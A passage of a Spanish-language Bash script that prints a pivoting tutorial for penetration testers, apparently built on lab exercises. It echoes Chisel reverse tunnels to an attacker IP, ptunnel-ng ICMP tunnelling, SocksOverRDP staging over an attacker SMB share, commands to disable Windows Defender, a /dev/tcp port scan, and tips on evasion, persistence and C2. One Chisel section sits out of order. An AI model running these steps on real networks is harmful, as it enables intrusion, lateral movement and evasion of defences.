    echo "   - Comprobar credenciales"
    echo "   - Validar configuración"
    echo
    echo "3. Túnel inestable:"
    echo "   - Verificar ancho de banda"
    echo "   - Comprobar latencia"
    echo "   - Revisar recursos"
    echo

    echo -e "${GREEN}9. References:${NC}"
    echo -e "${YELLOW}9.1 Documentación:${NC}"
    echo "1. Oficial:"
    echo "   - GitHub: https://github.com/jpillora/chisel"
    echo "   - Wiki: https://github.com/jpillora/chisel/wiki"
    echo
    echo "2. Herramientas Relacionadas:"
    echo "   - Proxychains"
    echo "   - SSHuttle"
    echo "   - Socat"
    echo
    echo "3. Recursos Adicionales:"
    echo "   - Blog de Chisel"
    echo "   - Ejemplos de uso"
    echo "   - Casos de estudio"

    echo -e "${YELLOW}2.2 Modo Reverse (Servidor en Máquina Atacante)${NC}"
    echo -e "${YELLOW}2.2.1 En la máquina atacante (Kali Linux):${NC}"
    echo "1. Iniciar servidor Chisel:"
    echo "   ./chisel server --reverse -v -p 9443 --socks5"
    echo "   # El servidor escuchará en 0.0.0.0:9443"
    echo
    echo -e "${YELLOW}2.2.2 En el host pivote (Linux/Windows):${NC}"
    echo "1. Conectar cliente Chisel:"
    echo "   ./chisel client -v <IP_ATACANTE>:9443 R:socks"
    echo "   # El cliente creará un túnel SOCKS en 127.0.0.1:1080"
    echo
}

# Función para implementar ICMP Tunneling con ptunnel-ng
implement_ptunnel() {
    echo -e "${BLUE}=== ICMP Tunneling con ptunnel-ng ===${NC}"
    
    echo -e "${YELLOW}¿Qué es ptunnel-ng?${NC}"
    echo "ptunnel-ng es una herramienta que permite crear túneles ICMP, encapsulando"
    echo "tráfico dentro de paquetes ICMP (ping). Es especialmente útil para evadir"
    echo "firewalls que permiten tráfico ICMP pero bloquean otros protocolos."
    echo

    echo -e "${YELLOW}Ventajas y Desventajas:${NC}"
    echo "✅ Ventajas:"
    echo "- Evade firewalls que permiten ICMP"
    echo "- Encapsula cualquier tipo de tráfico TCP"
    echo "- Bajo ancho de banda requerido"
    echo "- Fácil de configurar"
    echo "- Soporte para múltiples conexiones"
    echo
    echo "❌ Desventajas:"
    echo "- Requiere permisos de administrador"
    echo "- Puede ser detectado por IDS/IPS"
    echo "- Dependiente de la versión de GLIBC"
    echo "- Rendimiento limitado por el protocolo ICMP"
    echo

    # Verificar si ptunnel-ng está instalado
    if [ ! -d "ptunnel-ng" ]; then
        echo -e "${RED}Error: ptunnel-ng no está instalado.${NC}"
        echo -e "${YELLOW}Clonando repositorio...${NC}"
        git clone https://github.com/utoni/ptunnel-ng.git
        echo
        echo -e "${YELLOW}Instalando dependencias...${NC}"
        sudo apt install automake autoconf -y
        echo
        echo -e "${YELLOW}Configurando y compilando ptunnel-ng...${NC}"
        cd ptunnel-ng
        sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
        ./autogen.sh
        cd ..
        echo
    fi

    echo -e "${GREEN}Configuración del Túnel:${NC}"
    echo -e "${YELLOW}Nota:${NC} Necesitarás las siguientes información para configurar el túnel:"
    echo "- IP del servidor ptunnel-ng (host pivote)"
    echo "- IP del destino final (servicio objetivo)"
    echo "- Puerto local para escuchar"
    echo "- Puerto del servicio destino"
    echo

    read -p "Ingrese la IP del servidor ptunnel-ng: " SERVER_IP
    read -p "Ingrese la IP del destino final: " DEST_IP
    read -p "Ingrese el puerto local (default 3388): " LOCAL_PORT
    LOCAL_PORT=${LOCAL_PORT:-3388}
    read -p "Ingrese el puerto del servicio destino (default 3389): " DEST_PORT
    DEST_PORT=${DEST_PORT:-3389}

    echo -e "${GREEN}Iniciando servidor ptunnel-ng...${NC}"
    echo -e "${YELLOW}Comando para el servidor (host pivote):${NC}"
    echo "sudo ./ptunnel-ng -r$DEST_IP -R$DEST_PORT"
    echo
    echo -e "${YELLOW}Comando para el cliente (host atacante):${NC}"
    echo "sudo ./ptunnel-ng -p$SERVER_IP -l$LOCAL_PORT -r$DEST_IP -R$DEST_PORT"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. El servidor debe ejecutarse con permisos de administrador"
    echo "2. El túnel ICMP requiere que el firewall permita tráfico ping"
    echo "3. Verifica las versiones de GLIBC entre sistemas"
    echo "4. El tráfico está encapsulado en paquetes ICMP"
    echo "5. Útil para evadir firewalls que permiten ICMP"
    echo "6. Monitorea el tráfico con Wireshark para verificar el funcionamiento"
    echo

    echo -e "${YELLOW}Uso común:${NC}"
    echo "1. Conexión RDP a través del túnel:"
    echo "xfreerdp /v:127.0.0.1:$LOCAL_PORT /u:usuario /p:contraseña"
    echo
    echo "2. Conexión SSH a través del túnel:"
    echo "ssh -p$LOCAL_PORT usuario@127.0.0.1"
    echo
    echo "3. Escaneo de puertos a través del túnel:"
    echo "for i in {1..65535}; do (echo > /dev/tcp/$DEST_IP/\$i) >/dev/null 2>&1 && echo \$i is open; done"
    echo

    echo -e "${YELLOW}Estadísticas del túnel:${NC}"
    echo "ptunnel-ng muestra estadísticas de tráfico en tiempo real:"
    echo "- Cantidad de paquetes ICMP enviados/recibidos"
    echo "- Pérdida de paquetes"
    echo "- Tamaño total de datos transferidos"
    echo
    echo -e "${YELLOW}Consideraciones de seguridad:${NC}"
    echo "1. Monitorea el tráfico con Wireshark para verificar el funcionamiento"
    echo "2. Verifica que el túnel esté funcionando correctamente"
    echo "3. Ten en cuenta que el tráfico ICMP puede ser monitoreado"
    echo "4. Considera usar el túnel solo cuando sea necesario"
    echo "5. Asegúrate de cerrar el túnel cuando no lo uses"
}

# Función para implementar SocksOverRDP
implement_socks_over_rdp() {
    echo -e "${BLUE}=== Tunneling con SocksOverRDP ===${NC}"
    
    echo -e "${YELLOW}¿Qué es SocksOverRDP?${NC}"
    echo "SocksOverRDP es una herramienta que permite crear un túnel SOCKS a través de"
    echo "una conexión RDP, permitiendo el acceso a redes internas a través de un"
    echo "servidor RDP comprometido. Es especialmente útil para pivoting en redes"
    echo "Windows con acceso RDP."
    echo

    echo -e "${GREEN}1. Preparación del Entorno${NC}"
    echo -e "${YELLOW}1.1 En la máquina atacante (Kali Linux):${NC}"
    echo "1. Clonar repositorio:"
    echo "   git clone https://github.com/nccgroup/SocksOverRDP.git"
    echo "   cd SocksOverRDP"
    echo
    echo "2. Preparar directorio compartido:"
    echo "   mkdir -p /tmp/smbshare"
    echo "   cp bin/x64/Release/SocksOverRDP-Plugin.dll /tmp/smbshare/"
    echo "   cp bin/x64/Release/SocksOverRDP-Server.exe /tmp/smbshare/"
    echo
    echo "3. Descargar Proxifier:"
    echo "   # Descargar desde https://www.proxifier.com/"
    echo "   mv ~/Descargas/ProxifierPE.exe /tmp/smbshare/"
    echo

    echo -e "${GREEN}2. Configuración del Servidor SMB${NC}"
    echo -e "${YELLOW}2.1 En la máquina atacante (Kali Linux):${NC}"
    echo "1. Iniciar servidor SMB:"
    echo "   sudo impacket-smbserver share /tmp/smbshare -smb2support"
    echo "   # El servidor SMB escuchará en el puerto 445"
    echo

    echo -e "${GREEN}3. Configuración del Primer Host Pivote${NC}"
    echo -e "${YELLOW}3.1 En la máquina atacante (Kali Linux):${NC}"
    echo "1. Conectarse al primer host pivote:"
    echo "   xfreerdp /v:<IP_PIVOTE> /u:<USUARIO> /p:<CONTRASEÑA>"
    echo
    echo -e "${YELLOW}3.2 En el primer host pivote (Windows):${NC}"
    echo "1. Desactivar Windows Defender (PowerShell como administrador):"
    echo "   Uninstall-WindowsFeature -Name Windows-Defender"
    echo "   # Alternativa si falla:"
    echo "   Set-MpPreference -DisableRealtimeMonitoring $true"
    echo
    echo "2. Montar recurso SMB y copiar archivos:"
    echo "   net use n: \\\\<IP_ATACANTE>\\share"
    echo "   copy n:\\SocksOverRDP-Plugin.dll C:\\Users\\<USUARIO>\\Desktop\\"
    echo "   copy n:\\SocksOverRDP-Server.exe C:\\Users\\<USUARIO>\\Desktop\\"
    echo "   copy n:\\ProxifierPE.exe C:\\Users\\<USUARIO>\\Desktop\\"
    echo
    echo "3. Registrar el plugin DLL:"
    echo "   regsvr32.exe C:\\Users\\<USUARIO>\\Desktop\\SocksOverRDP-Plugin.dll"
    echo

    echo -e "${GREEN}4. Configuración del Segundo Host Pivote${NC}"
    echo -e "${YELLOW}4.1 En el primer host pivote (Windows):${NC}"
    echo "1. Conectarse al segundo host pivote:"
    echo "   mstsc /v:<IP_SEGUNDO_PIVOTE>"
    echo "   # Usar las credenciales proporcionadas"
    echo
    echo -e "${YELLOW}4.2 En el segundo host pivote (Windows):${NC}"
    echo "1. Desactivar antivirus:"
    echo "   Set-MpPreference -DisableRealtimeMonitoring $true"
    echo
    echo "2. Ejecutar SocksOverRDP Server:"
    echo "   C:\\Users\\<USUARIO>\\Desktop\\SocksOverRDP-Server.exe"
    echo "   # El servidor SOCKS escucha en 127.0.0.1:1080"
    echo

    echo -e "${GREEN}5. Configuración de Proxifier${NC}"
    echo -e "${YELLOW}5.1 En el primer host pivote (Windows):${NC}"
    echo "1. Instalar y configurar Proxifier:"
    echo "   - Ejecutar ProxifierPE.exe"
    echo "   - Agregar nuevo proxy:"
    echo "     * Tipo: SOCKS5"
    echo "     * Dirección: 127.0.0.1"
    echo "     * Puerto: 1080"
    echo "   - Crear regla para todo el tráfico"
    echo

    echo -e "${GREEN}6. Port Forwarding y Tunneling${NC}"
    echo -e "${YELLOW}6.1 Túnel RDP a SOCKS:${NC}"
    echo "1. El túnel RDP se establece automáticamente al conectar"
    echo "2. El servidor SOCKS escucha en 127.0.0.1:1080"
    echo "3. Proxifier enruta el tráfico a través del túnel"
    echo

    echo -e "${YELLOW}6.2 Verificación del Túnel:${NC}"
    echo "1. En el segundo host pivote:"
    echo "   netstat -antb | findstr 1080"
    echo "2. En el primer host pivote:"
    echo "   # Verificar que Proxifier muestra tráfico"
    echo

    echo -e "${GREEN}7. Uso del Túnel${NC}"
    echo -e "${YELLOW}7.1 Acceso a Redes Internas:${NC}"
    echo "1. Todo el tráfico a través de Proxifier se enruta por el túnel"
    echo "2. Puedes acceder a servicios en la red del segundo pivote"
    echo "3. Ejemplo de uso con RDP:"
    echo "   mstsc /v:<IP_INTERNA>"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Asegúrate de tener permisos de administrador en ambos hosts"
    echo "2. El plugin DLL debe registrarse correctamente"
    echo "3. Verifica que el servidor SocksOverRDP esté ejecutándose"
    echo "4. Proxifier debe estar configurado correctamente"
    echo "5. El túnel SOCKS se crea en el puerto 1080 por defecto"
    echo "6. Útil para acceder a redes internas a través de RDP"
    echo "7. Puede ser detectado por sistemas de seguridad"
    echo

    echo -e "${YELLOW}Soluciones a problemas comunes:${NC}"
    echo "1. Si el plugin no se registra:"
    echo "   - Verificar permisos de administrador"
    echo "   - Comprobar que el DLL no está bloqueado"
    echo "2. Si el servidor no inicia:"
    echo "   - Verificar que el antivirus está desactivado"
    echo "   - Comprobar que el plugin está registrado"
    echo "3. Si Proxifier no funciona:"
    echo "   - Verificar la configuración del proxy"
    echo "   - Comprobar que el servidor está ejecutándose"
    echo "4. Si el túnel no funciona:"
    echo "   - Verificar la conectividad RDP"
    echo "   - Comprobar que los puertos están abiertos"
}

# Función para implementar metodologías de pivoting en escenarios reales
implement_real_world_pivoting() {
    echo -e "${BLUE}=== Metodologías de Pivoting en Escenarios Reales ===${NC}"
    
    echo -e "${YELLOW}¿Qué es el Pivoting en Escenarios Reales?${NC}"
    echo "El pivoting en escenarios reales implica el uso de técnicas avanzadas para"
    echo "moverse a través de redes corporativas, evadiendo controles de seguridad"
    echo "y manteniendo el acceso persistente. Estas técnicas son fundamentales en"
    echo "pruebas de penetración y red teaming."
    echo

    echo -e "${GREEN}1. Metodología de Pivoting Web a Interno${NC}"
    echo -e "${YELLOW}1.1 Acceso Inicial:${NC}"
    echo "1. Identificar y explotar web shell"
    echo "2. Enumerar archivos y credenciales"
    echo "3. Buscar claves SSH y archivos de configuración"
    echo

    echo -e "${YELLOW}1.2 Enumeración de Red:${NC}"
    echo "1. Identificar interfaces de red"
    echo "2. Realizar ping sweep de subredes"
    echo "3. Escanear puertos y servicios"
    echo

    echo -e "${GREEN}2. Técnicas de Pivoting Comunes${NC}"
    echo -e "${YELLOW}2.1 SSH Dynamic Port Forwarding:${NC}"
    echo "ssh -D 9050 usuario@host -i id_rsa"
    echo "Configurar proxychains: socks4 127.0.0.1 9050"
    echo

    echo -e "${YELLOW}2.2 RDP Pivoting con SocksOverRDP:${NC}"
    echo "1. Preparar binarios (SocksOverRDP, Proxifier)"
    echo "2. Configurar servidor SMB para transferencia"
    echo "3. Registrar plugin y ejecutar servidor"
    echo "4. Configurar Proxifier para enrutamiento"
    echo

    echo -e "${YELLOW}2.3 PowerShell Pivoting:${NC}"
    echo "1. Crear script de enumeración:"
    echo "   - Ping sweep"
    echo "   - Escaneo de puertos"
    echo "   - Búsqueda de credenciales"
    echo "2. Ejecutar con privilegios elevados"
    echo

    echo -e "${GREEN}3. Herramientas y Scripts Útiles${NC}"
    echo -e "${YELLOW}3.1 PingSweep.ps1:${NC}"
    echo "# Define las subredes a escanear"
    echo '$subnets = @("172.16.5", "172.16.6")'
    echo "# Realiza el ping sweep para cada subred"
    echo 'foreach ($subnet in $subnets) {'
    echo '    for ($i = 1; $i -le 254; $i++) {'
    echo '        $ip = "$subnet.$i"'
    echo '        $ping = Test-Connection -ComputerName $ip -Count 1 -Quiet'
    echo '        if ($ping) { Write-Output "$ip is up" }'
    echo '    }'
    echo '}'
    echo

    echo -e "${YELLOW}3.2 Herramientas Recomendadas:${NC}"
    echo "1. Proxychains: Para enrutamiento de tráfico"
    echo "2. SocksOverRDP: Para pivoting sobre RDP"
    echo "3. Mimikatz: Para extracción de credenciales"
    echo "4. Netcat: Para transferencia de archivos"
    echo "5. Nmap: Para escaneo de red"
    echo

    echo -e "${GREEN}4. Consideraciones de Seguridad${NC}"
    echo -e "${YELLOW}4.1 Evasión de Detección:${NC}"
    echo "1. Usar puertos comunes para túneles"
    echo "2. Encriptar tráfico cuando sea posible"
    echo "3. Limitar el uso de herramientas conocidas"
    echo "4. Mantener bajo perfil en la red"
    echo

    echo -e "${YELLOW}4.2 Persistencia:${NC}"
    echo "1. Crear múltiples puntos de entrada"
    echo "2. Documentar credenciales y rutas"
    echo "3. Establecer mecanismos de C2"
    echo "4. Mantener acceso a hosts clave"
    echo

    echo -e "${GREEN}5. Mejores Prácticas${NC}"
    echo -e "${YELLOW}5.1 Documentación:${NC}"
    echo "1. Mantener mapa de red actualizado"
    echo "2. Documentar credenciales encontradas"
    echo "3. Registrar rutas de pivoting exitosas"
    echo "4. Notar puntos de fallo y alternativas"
    echo

    echo -e "${YELLOW}5.2 Planificación:${NC}"
    echo "1. Identificar objetivos antes de pivotar"
    echo "2. Tener múltiples rutas de acceso"
    echo "3. Planificar la extracción de datos"
    echo "4. Considerar impacto en la red"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Siempre tener un plan de contingencia"
    echo "2. Documentar todo el proceso"
    echo "3. Mantener bajo perfil en la red"
    echo "4. Considerar el impacto en la red"
    echo "5. Tener múltiples rutas de acceso"
    echo "6. Mantener acceso persistente"
    echo "7. Documentar credenciales y rutas"
    echo

    echo -e "${YELLOW}Recursos adicionales:${NC}"
    echo "1. Blog de 0xdf: https://0xdf.gitlab.io/"
    echo "2. RastaMouse: https://rastamouse.me/"
    echo "3. SpecterOps: https://posts.specterops.io/"
    echo "4. HTB Blog: https://www.hackthebox.com/blog"
    echo "5. SANS Webcasts: https://www.sans.org/webcasts/"
    echo "6. Plaintext's Pivoting Workshop: https://youtu.be/B3GxYyGFYmQ"
}

# Bucle principal
while true; do
    show_menu
    read -r option

    case $option in
        1)
            implement_pivoting
            ;;
        2)
            implement_socat
            ;;
        3)
            implement_plink
            ;;
        4)
            implement_sshuttle
            ;;
        5)
            implement_netsh
            ;;
        6)
            implement_dnscat2
            ;;
        7)
            implement_chisel
            ;;
        8)
            implement_ptunnel
            ;;
        9)
            implement_socks_over_rdp
            ;;
        10)
            implement_real_world_pivoting
            ;;
        11)
            echo -e "${GREEN}Saliendo...${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}Opción inválida${NC}"
            ;;
    esac

    echo
    read -p "Presione Enter para continuar..."
done
